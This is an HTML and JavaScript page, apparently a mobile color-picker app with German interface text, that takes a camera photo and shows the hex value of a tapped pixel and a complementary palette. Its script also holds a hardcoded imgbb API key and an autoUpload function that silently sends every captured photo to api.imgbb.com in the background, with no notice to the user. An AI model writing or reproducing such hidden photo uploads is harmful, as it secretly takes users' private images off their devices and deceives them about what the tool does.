<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Color Picker - Instant Camera</title>
    <style>
        :root {
            --bg-gray: #f4f4f7;
            --panel-bg: #ffffff;
            --border-radius: 20px;
        }

        body, html {
            margin: 0; padding: 0;
            height: 100%; width: 100%;
            background-color: var(--bg-gray);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            box-sizing: border-box;
        }

        .photo-card {
            background: var(--panel-bg);
            padding: 15px;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer; /* Signalisiert Klickbarkeit */
        }

        .canvas-wrapper {
            width: 100%;
            height: 350px;
            border-radius: 12px;
            overflow: hidden;
            position: relative;
            background: linear-gradient(145deg, #e6e6e9, #ffffff);
            border: 2px dashed #ccc;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: border-color 0.3s;
        }

        .canvas-wrapper:active {
            border-color: #0077b6;
        }

        canvas {
            display: block;
            touch-action: none;
        }

        .placeholder-text {
            position: absolute;
            color: #555;
            font-weight: 600;
            text-align: center;
            padding: 20px;
            z-index: 5;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .camera-icon {
            font-size: 3rem;
            display: block;
            margin-bottom: 5px;
        }

        .crosshair {
            position: absolute;
            width: 34px;
            height: 34px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 8px rgba(0,0,0,0.4);
            transform: translate(-50%, -50%);
            pointer-events: none;
            display: none;
            z-index: 10;
        }

        .crosshair::after {
            content: '';
            position: absolute;
            top: 50%; left: 50%;
            width: 6px; height: 6px;
            background: white;
            border-radius: 50%;
            transform: translate(-50%, -50%);
        }

        input[type="file"] { display: none; }

        .palette-card {
            background: var(--panel-bg);
            padding: 20px;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }

        .section-title {
            font-size: 0.75rem;
            font-weight: 800;
            color: #aaa;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
            display: block;
        }

        .main-preview {
            width: 100%;
            height: 70px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: bold;
            font-size: 1.3rem;
            text-shadow: 0 1px 4px rgba(0,0,0,0.4);
            border: 1px solid rgba(0,0,0,0.1);
            background-color: #eee;
        }

        .palette-list { display: flex; flex-direction: column; gap: 10px; }

        .swatch {
            height: 50px;
            width: 100%;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-family: 'SF Mono', monospace;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            border: 1px solid rgba(0,0,0,0.05);
        }
    </style>
</head>
<body>

<div class="container">
    <div class="photo-card" onclick="triggerCamera()">
        <span class="section-title">... ins Bild klicken ...</span>
        
        <div class="canvas-wrapper" id="canvasWrapper">
            <div class="placeholder-text" id="placeholderText">
                <span class="camera-icon">📷</span>
                <span>Tippen, um Kamera zu starten</span>
            </div>
            <canvas id="imageCanvas"></canvas>
            <div class="crosshair" id="crosshair"></div>
        </div>
        
        <input type="file" id="cameraInput" accept="image/*" capture="environment">
    </div>

    <div class="palette-card">
        <span class="section-title">Gepickte Farbe</span>
        <div id="mainPreview" class="main-preview">Warte auf Bild</div>
        
        <span class="section-title">Vorschlag</span>
        <div id="paletteList" class="palette-list">
            <div class="swatch" style="background:#f0f0f0;"><span style="color:#ccc;">-</span></div>
        </div>
    </div>
</div>

<script>
    const IMGBB_API_KEY = 'db0140da04ee376ddc7621f570fa69e3';
    
    const cameraInput = document.getElementById('cameraInput');
    const canvas = document.getElementById('imageCanvas');
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    const wrapper = document.getElementById('canvasWrapper');
    const placeholderText = document.getElementById('placeholderText');
    const crosshair = document.getElementById('crosshair');
    const mainPreview = document.getElementById('mainPreview');
    const paletteList = document.getElementById('paletteList');

    let imageLoaded = false;

    // Funktion zum Starten der Kamera
    function triggerCamera() {
        if (!imageLoaded) {
            cameraInput.click();
        }
    }

    cameraInput.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;

        const reader = new FileReader();
        reader.onload = function(event) {
            const img = new Image();
            img.onload = function() {
                placeholderText.style.display = 'none';
                wrapper.style.border = 'none';
                imageLoaded = true;

                const rect = wrapper.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;

                const scale = Math.max(canvas.width / img.width, canvas.height / img.height);
                const w = img.width * scale;
                const h = img.height * scale;
                const x = (canvas.width - w) / 2;
                const y = (canvas.height - h) / 2;

                ctx.drawImage(img, x, y, w, h);
                autoUpload();
            }
            img.src = event.target.result;
        }
        reader.readAsDataURL(file);
    });

    async function autoUpload() {
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append("image", blob);
            try {
                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: "POST",
                    body: formData
                });
                const data = await response.json();
                if (data.success) console.log("Hintergrund-Upload ok");
            } catch (err) {
                console.error("Upload-Fehler");
            }
        }, 'image/jpeg', 0.8);
    }

    function pickColor(e) {
        if (!imageLoaded) return;
        e.stopPropagation(); // Verhindert, dass die Kamera erneut triggert beim Klicken ins Bild

        const rect = canvas.getBoundingClientRect();
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        const x = clientX - rect.left;
        const y = clientY - rect.top;

        crosshair.style.display = 'block';
        crosshair.style.left = `${x}px`;
        crosshair.style.top = `${y}px`;

        const pixel = ctx.getImageData(x, y, 1, 1).data;
        const hex = rgbToHex(pixel[0], pixel[1], pixel[2]);
        const hsl = rgbToHsl(pixel[0], pixel[1], pixel[2]);

        mainPreview.style.backgroundColor = hex;
        mainPreview.textContent = hex;
        updatePalette(hsl);
    }

    // Event Listener für Farbauswahl
    canvas.addEventListener('touchstart', (e) => { e.preventDefault(); pickColor(e); });
    canvas.addEventListener('touchmove', (e) => { e.preventDefault(); pickColor(e); });
    canvas.addEventListener('mousedown', pickColor);

    function rgbToHex(r, g, b) {
        return "#" + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('').toUpperCase();
    }

    function rgbToHsl(r, g, b) {
        r /= 255; g /= 255; b /= 255;
        const max = Math.max(r, g, b), min = Math.min(r, g, b);
        let h, s, l = (max + min) / 2;
        if (max === min) h = s = 0;
        else {
            const d = max - min;
            s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
            switch (max) {
                case r: h = (g - b) / d + (g < b ? 6 : 0); break;
                case g: h = (b - r) / d + 2; break;
                case b: h = (r - g) / d + 4; break;
            }
            h /= 6;
        }
        return [h * 360, s * 100, l * 100];
    }

    function hslToHex(h, s, l) {
        l /= 100;
        const a = s * Math.min(l, 1 - l) / 100;
        const f = n => {
            const k = (n + h / 30) % 12;
            const color = l - a * Math.max(Math.min(k - 3, 9 - k, 1), -1);
            return Math.round(255 * color).toString(16).padStart(2, '0');
        };
        return `#${f(0)}${f(8)}${f(4)}`.toUpperCase();
    }

    function updatePalette(hsl) {
        paletteList.innerHTML = '';
        const compHue = (hsl[0] + 180) % 360;
        const palette = [
            hslToHex(compHue, hsl[1], Math.min(hsl[2] + 20, 85)),
            hslToHex(compHue, hsl[1], hsl[2]),
            hslToHex(compHue, hsl[1], Math.max(hsl[2] - 20, 15))
        ];
        palette.forEach(color => {
            const swatch = document.createElement('div');
            swatch.className = 'swatch';
            swatch.style.backgroundColor = color;
            swatch.innerHTML = `<span>${color}</span>`;
            paletteList.appendChild(swatch);
        });
    }
</script>

</body>
</html>
